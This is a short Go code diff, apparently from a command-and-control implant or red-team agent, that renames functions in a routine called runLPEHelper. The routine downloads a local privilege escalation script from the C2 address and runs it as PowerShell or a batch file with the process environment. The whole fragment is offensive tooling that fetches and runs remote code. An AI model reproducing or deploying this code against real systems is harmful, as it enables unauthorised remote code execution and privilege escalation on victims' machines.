@@ -21,7 +21,7 @@ func runLPEHelper(method, checksum string) (out string) {
 
 	logging.Printf("Downloading LPE script from %s", def.CCAddress+method)
 	var scriptData []byte
-	scriptData, err := c2transport.SmartDownload("", method, "", checksum)
+	scriptData, err := c2transport.FetchFile("", method, "", checksum)
 	if err != nil {
 		return "Download error: " + err.Error()
 	}
@@ -31,12 +31,12 @@ func runLPEHelper(method, checksum string) (out string) {
 	file_type := strings.Split(method, ".")[len(strings.Split(method, "."))-1]
 	switch file_type {
 	case "ps1":
-		out, err = agentutils.RunPSScript(scriptData, os.Environ())
+		out, err = agentutils.ExecutePowerShell(scriptData, os.Environ())
 		if err != nil {
 			return logging.Sprintf("LPE error: %s\n%v", out, err)
 		}
 	case "bat":
-		out, err = agentutils.RunBatchScript(scriptData, os.Environ())
+		out, err = agentutils.ExecuteBatch(scriptData, os.Environ())
 		if err != nil {
 			return logging.Sprintf("LPE error: %s\n%v", out, err)
 		}
